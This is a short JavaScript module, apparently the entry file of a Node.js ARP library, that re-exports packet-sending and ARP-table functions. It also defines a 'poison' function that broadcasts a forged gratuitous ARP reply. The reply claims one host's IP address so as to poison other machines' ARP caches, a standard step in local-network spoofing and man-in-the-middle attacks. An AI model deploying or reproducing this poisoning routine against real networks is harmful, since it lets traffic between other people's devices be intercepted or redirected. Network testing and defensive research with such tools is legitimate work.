var arpTable = require('./lib/arp_table.js')
var arpPacket = require('./lib/packet.js')

exports.send = arpPacket.send
exports.setInterface = arpPacket.setInterface
exports.table = arpTable.fetch

// Sends a Gratiutious ARP packet poisoning the given IP
exports.poison = function (ip1, ip2) {
  arpPacket.send({
    'op': 'reply',
    'src_ip': ip2,
    'dst_ip': ip1,
    'dst_mac': 'ff:ff:ff:ff:ff:ff'
  })
}
